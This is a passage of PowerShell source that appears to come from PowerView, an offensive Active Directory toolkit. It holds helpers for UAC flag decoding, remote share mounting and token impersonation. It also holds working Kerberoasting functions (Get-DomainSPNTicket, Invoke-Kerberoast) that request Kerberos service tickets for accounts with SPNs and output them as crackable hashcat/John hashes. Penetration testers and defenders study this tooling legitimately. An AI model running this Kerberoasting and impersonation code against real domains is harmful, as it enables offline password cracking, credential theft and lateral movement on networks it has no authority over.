LOCKOUT                        16
PASSWD_NOTREQD                 32
PASSWD_CANT_CHANGE             64
ENCRYPTED_TEXT_PWD_ALLOWED     128
TEMP_DUPLICATE_ACCOUNT         256
NORMAL_ACCOUNT                 512+
INTERDOMAIN_TRUST_ACCOUNT      2048
WORKSTATION_TRUST_ACCOUNT      4096
SERVER_TRUST_ACCOUNT           8192
DONT_EXPIRE_PASSWORD           65536+
MNS_LOGON_ACCOUNT              131072
SMARTCARD_REQUIRED             262144
TRUSTED_FOR_DELEGATION         524288
NOT_DELEGATED                  1048576
USE_DES_KEY_ONLY               2097152
DONT_REQ_PREAUTH               4194304
PASSWORD_EXPIRED               8388608
TRUSTED_TO_AUTH_FOR_DELEGATION 16777216
PARTIAL_SECRETS_ACCOUNT        67108864

.INPUTS

Int

Accepts an integer representing a UAC binary blob.

.OUTPUTS

System.Collections.Specialized.OrderedDictionary

An ordered dictionary with the converted UAC fields.

.LINK

https://support.microsoft.com/en-us/kb/305144
#>

    [OutputType('System.Collections.Specialized.OrderedDictionary')]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('UAC', 'useraccountcontrol')]
        [Int]
        $Value,

        [Switch]
        $ShowAll
    )

    BEGIN {
        # values from https://support.microsoft.com/en-us/kb/305144
        $UACValues = New-Object System.Collections.Specialized.OrderedDictionary
        $UACValues.Add("SCRIPT", 1)
        $UACValues.Add("ACCOUNTDISABLE", 2)
        $UACValues.Add("HOMEDIR_REQUIRED", 8)
        $UACValues.Add("LOCKOUT", 16)
        $UACValues.Add("PASSWD_NOTREQD", 32)
        $UACValues.Add("PASSWD_CANT_CHANGE", 64)
        $UACValues.Add("ENCRYPTED_TEXT_PWD_ALLOWED", 128)
        $UACValues.Add("TEMP_DUPLICATE_ACCOUNT", 256)
        $UACValues.Add("NORMAL_ACCOUNT", 512)
        $UACValues.Add("INTERDOMAIN_TRUST_ACCOUNT", 2048)
        $UACValues.Add("WORKSTATION_TRUST_ACCOUNT", 4096)
        $UACValues.Add("SERVER_TRUST_ACCOUNT", 8192)
        $UACValues.Add("DONT_EXPIRE_PASSWORD", 65536)
        $UACValues.Add("MNS_LOGON_ACCOUNT", 131072)
        $UACValues.Add("SMARTCARD_REQUIRED", 262144)
        $UACValues.Add("TRUSTED_FOR_DELEGATION", 524288)
        $UACValues.Add("NOT_DELEGATED", 1048576)
        $UACValues.Add("USE_DES_KEY_ONLY", 2097152)
        $UACValues.Add("DONT_REQ_PREAUTH", 4194304)
        $UACValues.Add("PASSWORD_EXPIRED", 8388608)
        $UACValues.Add("TRUSTED_TO_AUTH_FOR_DELEGATION", 16777216)
        $UACValues.Add("PARTIAL_SECRETS_ACCOUNT", 67108864)
    }

    PROCESS {
        $ResultUACValues = New-Object System.Collections.Specialized.OrderedDictionary

        if ($ShowAll) {
            ForEach ($UACValue in $UACValues.GetEnumerator()) {
                if ( ($Value -band $UACValue.Value) -eq $UACValue.Value) {
                    $ResultUACValues.Add($UACValue.Name, "$($UACValue.Value)+")
                }
                else {
                    $ResultUACValues.Add($UACValue.Name, "$($UACValue.Value)")
                }
            }
        }
        else {
            ForEach ($UACValue in $UACValues.GetEnumerator()) {
                if ( ($Value -band $UACValue.Value) -eq $UACValue.Value) {
                    $ResultUACValues.Add($UACValue.Name, "$($UACValue.Value)")
                }
            }
        }
        $ResultUACValues
    }
}

function Add-RemoteConnection {
<#
.SYNOPSIS

Pseudo "mounts" a connection to a remote path using the specified
credential object, allowing for access of remote resources. If a -Path isn't
specified, a -ComputerName is required to pseudo-mount IPC$.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: PSReflect  

.DESCRIPTION

This function uses WNetAddConnection2W to make a 'temporary' (i.e. not saved) connection
to the specified remote -Path (\\UNC\share) with the alternate credentials specified in the
-Credential object. If a -Path isn't specified, a -ComputerName is required to pseudo-mount IPC$.

To destroy the connection, use Remove-RemoteConnection with the same specified \\UNC\share path
or -ComputerName.

.PARAMETER ComputerName

Specifies the system to add a \\ComputerName\IPC$ connection for.

.PARAMETER Path

Specifies the remote \\UNC\path to add the connection for.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the remote system.

.EXAMPLE

$Cred = Get-Credential
Add-RemoteConnection -ComputerName 'PRIMARY.testlab.local' -Credential $Cred

.EXAMPLE

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Add-RemoteConnection -Path '\\PRIMARY.testlab.local\C$\' -Credential $Cred

.EXAMPLE

$Cred = Get-Credential
@('PRIMARY.testlab.local','SECONDARY.testlab.local') | Add-RemoteConnection  -Credential $Cred
#>

    [CmdletBinding(DefaultParameterSetName = 'ComputerName')]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ParameterSetName = 'ComputerName', ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ComputerName,

        [Parameter(Position = 0, ParameterSetName = 'Path', Mandatory = $True)]
        [ValidatePattern('\\\\.*\\.*')]
        [String[]]
        $Path,

        [Parameter(Mandatory = $True)]
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential
    )

    BEGIN {
        $NetResourceInstance = [Activator]::CreateInstance($NETRESOURCEW)
        $NetResourceInstance.dwType = 1
    }

    PROCESS {
        $Paths = @()
        if ($PSBoundParameters['ComputerName']) {
            ForEach ($TargetComputerName in $ComputerName) {
                $TargetComputerName = $TargetComputerName.Trim('\')
                $Paths += ,"\\$TargetComputerName\IPC$"
            }
        }
        else {
            $Paths += ,$Path
        }

        ForEach ($TargetPath in $Paths) {
            $NetResourceInstance.lpRemoteName = $TargetPath
            Write-Verbose "[Add-RemoteConnection] Attempting to mount: $TargetPath"

            # https://msdn.microsoft.com/en-us/library/windows/desktop/aa385413(v=vs.85).aspx
            #   CONNECT_TEMPORARY = 4
            $Result = $Mpr::WNetAddConnection2W($NetResourceInstance, $Credential.GetNetworkCredential().Password, $Credential.UserName, 4)

            if ($Result -eq 0) {
                Write-Verbose "$TargetPath successfully mounted"
            }
            else {
                Throw "[Add-RemoteConnection] error mounting $TargetPath : $(([ComponentModel.Win32Exception]$Result).Message)"
            }
        }
    }
}

function Remove-RemoteConnection {
<#
.SYNOPSIS

Destroys a connection created by New-RemoteConnection.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: PSReflect  

.DESCRIPTION

This function uses WNetCancelConnection2 to destroy a connection created by
New-RemoteConnection. If a -Path isn't specified, a -ComputerName is required to
'unmount' \\$ComputerName\IPC$.

.PARAMETER ComputerName

Specifies the system to remove a \\ComputerName\IPC$ connection for.

.PARAMETER Path

Specifies the remote \\UNC\path to remove the connection for.

.EXAMPLE

Remove-RemoteConnection -ComputerName 'PRIMARY.testlab.local'

.EXAMPLE

Remove-RemoteConnection -Path '\\PRIMARY.testlab.local\C$\'

.EXAMPLE

@('PRIMARY.testlab.local','SECONDARY.testlab.local') | Remove-RemoteConnection
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [CmdletBinding(DefaultParameterSetName = 'ComputerName')]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ParameterSetName = 'ComputerName', ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ComputerName,

        [Parameter(Position = 0, ParameterSetName = 'Path', Mandatory = $True)]
        [ValidatePattern('\\\\.*\\.*')]
        [String[]]
        $Path
    )

    PROCESS {
        $Paths = @()
        if ($PSBoundParameters['ComputerName']) {
            ForEach ($TargetComputerName in $ComputerName) {
                $TargetComputerName = $TargetComputerName.Trim('\')
                $Paths += ,"\\$TargetComputerName\IPC$"
            }
        }
        else {
            $Paths += ,$Path
        }

        ForEach ($TargetPath in $Paths) {
            Write-Verbose "[Remove-RemoteConnection] Attempting to unmount: $TargetPath"
            $Result = $Mpr::WNetCancelConnection2($TargetPath, 0, $True)

            if ($Result -eq 0) {
                Write-Verbose "$TargetPath successfully ummounted"
            }
            else {
                Throw "[Remove-RemoteConnection] error unmounting $TargetPath : $(([ComponentModel.Win32Exception]$Result).Message)"
            }
        }
    }
}

function Invoke-UserImpersonation {
<#
.SYNOPSIS

Creates a new "runas /netonly" type logon and impersonates the token.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: PSReflect  

.DESCRIPTION

This function uses LogonUser() with the LOGON32_LOGON_NEW_CREDENTIALS LogonType
to simulate "runas /netonly". The resulting token is then impersonated with
ImpersonateLoggedOnUser() and the token handle is returned for later usage
with Invoke-RevertToSelf.

.PARAMETER Credential

A [Management.Automation.PSCredential] object with alternate credentials
to impersonate in the current thread space.

.PARAMETER TokenHandle

An IntPtr TokenHandle returned by a previous Invoke-UserImpersonation.
If this is supplied, LogonUser() is skipped and only ImpersonateLoggedOnUser()
is executed.

.PARAMETER Quiet

Suppress any warnings about STA vs MTA.

.EXAMPLE

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Invoke-UserImpersonation -Credential $Cred

.OUTPUTS

IntPtr

The TokenHandle result from LogonUser.
#>

    [OutputType([IntPtr])]
    [CmdletBinding(DefaultParameterSetName = 'Credential')]
    Param(
        [Parameter(Mandatory = $True, ParameterSetName = 'Credential')]
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential,

        [Parameter(Mandatory = $True, ParameterSetName = 'TokenHandle')]
        [ValidateNotNull()]
        [IntPtr]
        $TokenHandle,

        [Switch]
        $Quiet
    )

    if (([System.Threading.Thread]::CurrentThread.GetApartmentState() -ne 'STA') -and (-not $PSBoundParameters['Quiet'])) {
        Write-Warning "[Invoke-UserImpersonation] powershell.exe is not currently in a single-threaded apartment state, token impersonation may not work."
    }

    if ($PSBoundParameters['TokenHandle']) {
        $LogonTokenHandle = $TokenHandle
    }
    else {
        $LogonTokenHandle = [IntPtr]::Zero
        $NetworkCredential = $Credential.GetNetworkCredential()
        $UserDomain = $NetworkCredential.Domain
        $UserName = $NetworkCredential.UserName
        Write-Warning "[Invoke-UserImpersonation] Executing LogonUser() with user: $($UserDomain)\$($UserName)"

        # LOGON32_LOGON_NEW_CREDENTIALS = 9, LOGON32_PROVIDER_WINNT50 = 3
        #   this is to simulate "runas.exe /netonly" functionality
        $Result = $Advapi32::LogonUser($UserName, $UserDomain, $NetworkCredential.Password, 9, 3, [ref]$LogonTokenHandle);$LastError = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error();

        if (-not $Result) {
            throw "[Invoke-UserImpersonation] LogonUser() Error: $(([ComponentModel.Win32Exception] $LastError).Message)"
        }
    }

    # actually impersonate the token from LogonUser()
    $Result = $Advapi32::ImpersonateLoggedOnUser($LogonTokenHandle)

    if (-not $Result) {
        throw "[Invoke-UserImpersonation] ImpersonateLoggedOnUser() Error: $(([ComponentModel.Win32Exception] $LastError).Message)"
    }

    Write-Verbose "[Invoke-UserImpersonation] Alternate credentials successfully impersonated"
    $LogonTokenHandle
}

function Invoke-RevertToSelf {
<#
.SYNOPSIS

Reverts any token impersonation.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: PSReflect  

.DESCRIPTION

This function uses RevertToSelf() to revert any impersonated tokens.
If -TokenHandle is passed (the token handle returned by Invoke-UserImpersonation),
CloseHandle() is used to close the opened handle.

.PARAMETER TokenHandle

An optional IntPtr TokenHandle returned by Invoke-UserImpersonation.

.EXAMPLE

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
$Token = Invoke-UserImpersonation -Credential $Cred
Invoke-RevertToSelf -TokenHandle $Token
#>

    [CmdletBinding()]
    Param(
        [ValidateNotNull()]
        [IntPtr]
        $TokenHandle
    )

    if ($PSBoundParameters['TokenHandle']) {
        Write-Warning "[Invoke-RevertToSelf] Reverting token impersonation and closing LogonUser() token handle"
        $Result = $Kernel32::CloseHandle($TokenHandle)
    }

    $Result = $Advapi32::RevertToSelf();$LastError = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error();

    if (-not $Result) {
        throw "[Invoke-RevertToSelf] RevertToSelf() Error: $(([ComponentModel.Win32Exception] $LastError).Message)"
    }

    Write-Verbose "[Invoke-RevertToSelf] Token impersonation successfully reverted"
}

function Get-DomainSPNTicket {
<#
.SYNOPSIS

Request the kerberos ticket for a specified service principal name (SPN).

Author: machosec, Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Invoke-UserImpersonation, Invoke-RevertToSelf  

.DESCRIPTION

This function will either take one/more SPN strings, or one/more PowerView.User objects
(the output from Get-DomainUser) and will request a kerberos ticket for the given SPN
using System.IdentityModel.Tokens.KerberosRequestorSecurityToken. The encrypted
portion of the ticket is then extracted and output in either crackable John or Hashcat
format (deafult of John).

.PARAMETER SPN

Specifies the service principal name to request the ticket for.

.PARAMETER User

Specifies a PowerView.User object (result of Get-DomainUser) to request the ticket for.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the remote domain using Invoke-UserImpersonation.

.EXAMPLE

Get-DomainSPNTicket -SPN "HTTP/web.testlab.local"

Request a kerberos service ticket for the specified SPN.

.EXAMPLE

"HTTP/web1.testlab.local","HTTP/web2.testlab.local" | Get-DomainSPNTicket

Request kerberos service tickets for all SPNs passed on the pipeline.

.EXAMPLE

Get-DomainUser -SPN | Get-DomainSPNTicket

Request kerberos service tickets for all users with non-null SPNs.

.INPUTS

String

Accepts one or more SPN strings on the pipeline with the RawSPN parameter set.

.INPUTS

PowerView.User

Accepts one or more PowerView.User objects on the pipeline with the User parameter set.

.OUTPUTS

PowerView.SPNTicket

Outputs a custom object containing the SamAccountName, ServicePrincipalName, and encrypted ticket section.
#>

    [OutputType('PowerView.SPNTicket')]
    [CmdletBinding(DefaultParameterSetName = 'RawSPN')]
    Param (
        [Parameter(Position = 0, ParameterSetName = 'RawSPN', Mandatory = $True, ValueFromPipeline = $True)]
        [ValidatePattern('.*/.*')]
        [Alias('ServicePrincipalName')]
        [String[]]
        $SPN,

        [Parameter(Position = 0, ParameterSetName = 'User', Mandatory = $True, ValueFromPipeline = $True)]
        [ValidateScript({ $_.PSObject.TypeNames[0] -eq 'PowerView.User' })]
        [Object[]]
        $User,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $Null = [Reflection.Assembly]::LoadWithPartialName('System.IdentityModel')

        if ($PSBoundParameters['Credential']) {
            $LogonToken = Invoke-UserImpersonation -Credential $Credential
        }
    }

    PROCESS {
        if ($PSBoundParameters['User']) {
            $TargetObject = $User
        }
        else {
            $TargetObject = $SPN
        }

        ForEach ($Object in $TargetObject) {
            if ($PSBoundParameters['User']) {
                $UserSPN = $Object.ServicePrincipalName
                $SamAccountName = $Object.SamAccountName
                $DistinguishedName = $Object.DistinguishedName
            }
            else {
                $UserSPN = $Object
                $SamAccountName = 'UNKNOWN'
                $DistinguishedName = 'UNKNOWN'
            }

            # if a user has multiple SPNs we only take the first one otherwise the service ticket request fails miserably :) -@st3r30byt3
            if ($UserSPN -is [System.DirectoryServices.ResultPropertyValueCollection]) {
                $UserSPN = $UserSPN[0]
            }

            try {
                $Ticket = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $UserSPN
            }
            catch {
                Write-Warning "[Get-DomainSPNTicket] Error requesting ticket for SPN '$UserSPN' from user '$DistinguishedName' : $_"
            }
            if ($Ticket) {
                $TicketByteStream = $Ticket.GetRequest()
            }
            if ($TicketByteStream) {
                $TicketHexStream = [System.BitConverter]::ToString($TicketByteStream) -replace '-'
                [System.Collections.ArrayList]$Parts = ($TicketHexStream -replace '^(.*?)04820...(.*)','$2') -Split 'A48201'
                $Parts.RemoveAt($Parts.Count - 1)
                $Hash = $Parts -join 'A48201'
                $Hash = $Hash.Insert(32, '$')

                $Out = New-Object PSObject
                $Out | Add-Member Noteproperty 'SamAccountName' $SamAccountName
                $Out | Add-Member Noteproperty 'DistinguishedName' $DistinguishedName
                $Out | Add-Member Noteproperty 'ServicePrincipalName' $Ticket.ServicePrincipalName

                if ($DistinguishedName -ne 'UNKNOWN') {
                    $UserDomain = $DistinguishedName.SubString($DistinguishedName.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                }
                else {
                    $UserDomain = 'UNKNOWN'
                }

                # hashcat output format (and now John's)
                $HashFormat = "`$krb5tgs`$23`$*$SamAccountName`$$UserDomain`$$($Ticket.ServicePrincipalName)*`$$Hash"

                $Out | Add-Member Noteproperty 'Hash' $HashFormat
                $Out.PSObject.TypeNames.Insert(0, 'PowerView.SPNTicket')
                Write-Output $Out
            }
        }
    }

    END {
        if ($LogonToken) {
            Invoke-RevertToSelf -TokenHandle $LogonToken
        }
    }
}

function Invoke-Kerberoast {
<#
.SYNOPSIS

Requests service tickets for kerberoast-able accounts and returns extracted ticket hashes.

Author: Will Schroeder (@harmj0y), @machosec  
License: BSD 3-Clause  
Required Dependencies: Invoke-UserImpersonation, Invoke-RevertToSelf, Get-DomainUser, Get-DomainSPNTicket  

.DESCRIPTION

Uses Get-DomainUser to query for user accounts with non-null service principle
names (SPNs) and uses Get-SPNTicket to request/extract the crackable ticket information.

.PARAMETER Identity

A SamAccountName (e.g. harmj0y), DistinguishedName (e.g. CN=harmj0y,CN=Users,DC=testlab,DC=local),
SID (e.g. S-1-5-21-890171859-3433809279-3366196753-1108), or GUID (e.g. 4c435dd7-dc58-4b14-9a5e-1fdb0e80d201).
Wildcards accepted.

.PARAMETER Domain

Specifies the domain to use for the query, defaults to the current domain.

.PARAMETER LDAPFilter

Specifies an LDAP query string that is used to filter Active Directory objects.

.PARAMETER SearchBase

The LDAP source to search through, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
Useful for OU queries.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to.

.PARAMETER SearchScope

Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).

.PARAMETER ResultPageSize

Specifies the PageSize to set for the LDAP searcher object.

.PARAMETER ServerTimeLimit

Specifies the maximum amount of time the server spends searching. Default of 120 seconds.

.PARAMETER Tombstone

Switch. Specifies that the searcher should also return deleted/tombstoned objects.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.EXAMPLE

Invoke-Kerberoast | fl

Kerberoasts all found SPNs for the current domain.

.EXAMPLE

Invoke-Kerberoast -Domain dev.testlab.local | fl

Kerberoasts all found SPNs for the testlab.local domain, outputting to HashCat
format instead of John (the default).

.EXAMPLE

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -orce
$Cred = New-Object System.Management.Automation.PSCredential('TESTLB\dfm.a', $SecPassword)
Invoke-Kerberoast -Credential $Cred -Verbose -Domain testlab.local | fl

Kerberoasts all found SPNs for the testlab.local domain using alternate credentials.

.OUTPUTS

PowerView.SPNTicket

Outputs a custom object containing the SamAccountName, ServicePrincipalName, and encrypted ticket section.
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.SPNTicket')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        $Identity,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $UserSearcherArguments = @{
            'SPN' = $True
            'Properties' = 'samaccountname,distinguishedname,serviceprincipalname'
        }
        if ($PSBoundParameters['Domain']) { $UserSearcherArguments['Domain'] = $Domain }
        if ($PSBoundParameters['LDAPFilter']) { $UserSearcherArguments['LDAPFilter'] = $LDAPFilter }
        if ($PSBoundParameters['SearchBase']) { $UserSearcherArguments['SearchBase'] = $SearchBase }
        if ($PSBoundParameters['Server']) { $UserSearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $UserSearcherArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $UserSearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $UserSearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['Tombstone']) { $UserSearcherArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $UserSearcherArguments['Credential'] = $Credential }

        if ($PSBoundParameters['Credential']) {
            $LogonToken = Invoke-UserImpersonation -Credential $Credential
        }
    }

    PROCESS {
        if ($PSBoundParameters['Identity']) { $UserSearcherArguments['Identity'] = $Identity }
        Get-DomainUser @UserSearcherArguments | Where-Object {$_.samaccountname -ne 'krbtgt'} | Get-DomainSPNTicket
    }

    END {
        if ($LogonToken) {
            Invoke-RevertToSelf -TokenHandle $LogonToken
        }
    }
}

function Convert-LDAPProperty {
<#
.SYNOPSIS

Helper that converts specific LDAP property result fields and outputs
a custom psobject.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: None  

.DESCRIPTION

Converts a set of raw LDAP properties results from ADSI/LDAP searches
into a proper PSObject. Used by several of the Get-Domain* function.

.PARAMETER Properties

Properties object to extract out LDAP fields for display.

.OUTPUTS

System.Management.Automation.PSCustomObject

A custom PSObject with LDAP hashtable properties translated.
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('System.Management.Automation.PSCustomObject')]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $True, ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        $Properties
    )

    $ObjectProperties = @{}

    $Properties.PropertyNames | ForEach-Object {
        if ($_ -ne 'adspath') {
            if (($_ -eq 'objectsid') -or ($_ -eq 'sidhistory')) {
                # convert all listed sids (i.e. if multiple are listed in sidHistory)
                $ObjectProperties[$_] = $Properties[$_] | ForEach-Object { (New-Object System.Security.Principal.SecurityIdentifier($_, 0)).Value }
            }
            elseif ($_ -eq 'grouptype') {
                $ObjectProperties[$_] = $Properties[$_][0] -as $GroupTypeEnum
            }
            elseif ($_ -eq 'samaccounttype') {
                $ObjectProperties[$_] = $Properties[$_][0] -as $SamAccountTypeEnum
            }
            elseif ($_ -eq 'objectguid') {
                # convert the GUID to a string
                $ObjectProperties[$_] = (New-Object Guid (,$Properties[$_][0])).Guid
            }
            elseif ($_ -eq 'useraccountcontrol') {
                $ObjectProperties[$_] = $Properties[$_][0] -as $UACEnum
            }
            elseif ($_ -eq 'ntsecuritydescriptor') {
                # $ObjectProperties[$_] = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $Properties[$_][0], 0
                $Descriptor = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $Properties[$_][0], 0
                if ($Descriptor.Owner) {
                    $ObjectProperties['Owner'] = $Descriptor.Owner
                }
                if ($Descriptor.Group) {
                    $ObjectProperties['Group'] = $Descriptor.Group
                }
                if ($Descriptor.DiscretionaryAcl) {
                    $ObjectProperties['DiscretionaryAcl'] = $Descriptor.DiscretionaryAcl
                }
                if ($Descriptor.SystemAcl) {
                    $ObjectProperties['SystemAcl'] = $Descriptor.SystemAcl
                }
            }
            elseif ($_ -eq 'accountexpires') {
                if ($Properties[$_][0] -gt [DateTime]::MaxValue.Ticks) {
                    $ObjectProperties[$_] = "NEVER"
                }
                else {
                    $ObjectProperties[$_] = [datetime]::fromfiletime($Properties[$_][0])
                }
            }
            elseif ( ($_ -eq 'lastlogon') -or ($_ -eq 'lastlogontimestamp') -or ($_ -eq 'pwdlastset') -or ($_ -eq 'lastlogoff') -or ($_ -eq 'badPasswordTime') ) {
                # convert timestamps
                if ($Properties[$_][0] -is [System.MarshalByRefObject]) {
                    # if we have a System.__ComObject
                    $Temp = $Properties[$_][0]
                    [Int32]$High = $Temp.GetType().InvokeMember('HighPart', [System.Reflection.BindingFlags]::GetProperty, $Null, $Temp, $Null)
                    [Int32]$Low  = $Temp.GetType().InvokeMember('LowPart',  [System.Reflection.BindingFlags]::GetProperty, $Null, $Temp, $Null)
                    $ObjectProperties[$_] = ([datetime]::FromFileTime([Int64]("0x{0:x8}{1:x8}" -f $High, $Low)))
                }
                else {
                    # otherwise just a string
                    $ObjectProperties[$_] = ([datetime]::FromFileTime(($Properties[$_][0])))
                }
            }
            elseif ($Properties[$_][0] -is [System.MarshalByRefObject]) {
                # try to convert misc com objects
                $Prop = $Properties[$_]
                try {
                    $Temp = $Prop[$_][0]
                    [Int32]$High = $Temp.GetType().InvokeMember('HighPart', [System.Reflection.BindingFlags]::GetProperty, $Null, $Temp, $Null)
                    [Int32]$Low  = $Temp.GetType().InvokeMember('LowPart',  [System.Reflection.BindingFlags]::GetProperty, $Null, $Temp, $Null)
                    $ObjectProperties[$_] = [Int64]("0x{0:x8}{1:x8}" -f $High, $Low)
                }
                catch {
                    Write-Verbose "[Convert-LDAPProperty] error: $_"
                    $ObjectProperties[$_] = $Prop[$_]
                }
            }
            elseif ($Properties[$_].count -eq 1) {
                $ObjectProperties[$_] = $Properties[$_][0]
            }
            else {
                $ObjectProperties[$_] = $Properties[$_]
            }
        }
    }
    try {
        New-Object -TypeName PSObject -Property $ObjectProperties
    }
    catch {
        Write-Warning "[Convert-LDAPProperty] Error parsing LDAP properties : $_"
    }
}

function Get-DomainSearcher {
<#
.SYNOPSIS

Helper used by various functions that builds a custom AD searcher object.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-Domain  

.DESCRIPTION

Takes a given domain and a number of customizations and returns a
System.DirectoryServices.DirectorySearcher object. This function is used
heavily by other LDAP/ADSI searcher functions (Verb-Domain*).

.PARAMETER Domain

Specifies the domain to use for the query, defaults to the current domain.

.PARAMETER LDAPFilter

Specifies an LDAP query string that is used to filter Active Directory objects.

.PARAMETER Properties

Specifies the properties of the output object to retrieve from the server.

.PARAMETER SearchBase

The LDAP source to search through, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
Useful for OU queries.

.PARAMETER SearchBasePrefix

Specifies a prefix for the LDAP search string (i.e. "CN=Sites,CN=Configuration").

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to for the search.

.PARAMETER SearchScope

Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).

.PARAMETER ResultPageSize

Specifies the PageSize to set for the LDAP searcher object.

.PARAMETER ResultPageSize

Specifies the PageSize to set for the LDAP searcher object.

.PARAMETER ServerTimeLimit

Specifies the maximum amount of time the server spends searching. Default of 120 seconds.

.PARAMETER SecurityMasks

Specifies an option for examining security information of a directory object.
One of 'Dacl', 'Group', 'None', 'Owner', 'Sacl'.

.PARAMETER Tombstone

Switch. Specifies that the searcher should also return deleted/tombstoned objects.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.EXAMPLE

Get-DomainSearcher -Domain testlab.local

Return a searcher for all objects in testlab.local.

.EXAMPLE

Get-DomainSearcher -Domain testlab.local -LDAPFilter '(samAccountType=805306368)' -Properties 'SamAccountName,lastlogon'

Return a searcher for user objects in testlab.local and only return the SamAccountName and LastLogon properties.

.EXAMPLE

Get-DomainSearcher -SearchBase "LDAP://OU=secret,DC=testlab,DC=local"

Return a searcher that searches through the specific ADS/LDAP search base (i.e. OU).

.OUTPUTS

System.DirectoryServices.DirectorySearcher
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('System.DirectoryServices.DirectorySearcher')]
    [CmdletBinding()]
    Param(
        [Parameter(ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [String]
        $SearchBasePrefix,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit = 120,

        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $SecurityMasks,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
